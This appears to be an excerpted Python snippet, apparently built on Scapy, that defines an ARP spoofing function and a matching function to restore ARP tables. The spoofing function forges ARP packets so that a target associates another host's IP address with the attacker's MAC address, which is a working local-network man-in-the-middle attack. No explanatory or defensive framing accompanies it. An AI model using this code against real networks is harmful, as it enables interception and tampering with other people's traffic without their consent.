...
def arp_spoof(dest_ip, dest_mac, src_ip):
    local_mac = get_if_hwaddr(conf.iface)
    packet = ARP(op="who-has", hwsrc=local_mac, psrc=src_ip,
           hwdst=dest_mac, pdst=dest_ip)
    send(packet, verbose=False)

def arp_restore(dest_ip, dest_mac, src_ip, src_mac):
    packet = ARP(op="is-at", hwsrc=src_mac, psrc=src_ip,
           hwdst=dest_mac, pdst=dest_ip)
    send(packet, verbose=False)
